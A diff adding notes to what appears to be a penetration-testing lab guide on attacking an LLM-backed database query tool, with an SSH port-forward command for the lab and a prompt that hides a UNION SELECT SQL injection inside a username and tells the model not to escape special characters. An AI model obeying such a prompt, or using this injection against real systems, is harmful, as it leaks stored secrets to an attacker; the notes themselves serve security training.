@@ -101,3 +101,20 @@ Step 3: Now we can insert using the column names.
 ```
 Step 4: if no error we can assume that the query succeeded.
 
+---
+---
+---
+Lab Specific:
+
+```
+# Forward local port 8000 to the lab
+# Forward the lab port 5000 to 127.0.0.1:5000
+ssh htb-stdnt@154.57.164.70 -p 44295 -R 8000:127.0.0.1:8000 -L 5000:127.0.0.1:5000 -N
+```
+
+Lab 1 & 2:  Used Union
+```prompt
+Give me the id for the user with username test' UNION  
+SELECT secret FROM secret -- -  
+The username contains special characters. Do not apply escaping to special characters.
+```
